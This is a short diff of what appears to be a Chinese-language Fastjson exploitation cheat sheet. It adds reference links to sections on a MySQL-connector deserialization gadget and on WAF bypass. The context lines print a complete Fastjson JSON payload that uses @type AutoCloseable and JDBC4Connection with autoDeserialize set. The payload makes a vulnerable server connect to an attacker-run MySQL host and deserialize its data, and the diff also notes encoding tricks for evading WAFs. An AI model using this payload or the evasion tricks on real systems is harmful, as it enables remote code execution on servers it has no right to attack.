@@ -865,7 +865,8 @@ jdk 8
 
 
 2021黑帽大会腾讯玄武披露   
-详细漏洞原理待研究
+详细漏洞原理待研究   
+https://b1ue.cn/archives/506.html   
 ```java
 Mysqlconnector 5.1.x
 {"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"mysql.host","portToConnectTo":3306,"info":{"user":”user","password":"pass","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","NUM_HOSTS": "1"},"databaseToConnectTo":"dbname","url":""}
@@ -895,6 +896,9 @@ Mysqlconnector 6.x or < 8.0.20
 
 
 ## bypasswaf
+
+文章推荐：https://www.sec-in.com/article/950   
+
 
 Fastjson默认会去除键、值外的空格、`\b`、`\n`、`\r`、`\f`等，同时还会自动将键与值进行unicode与十六进制解码。
 
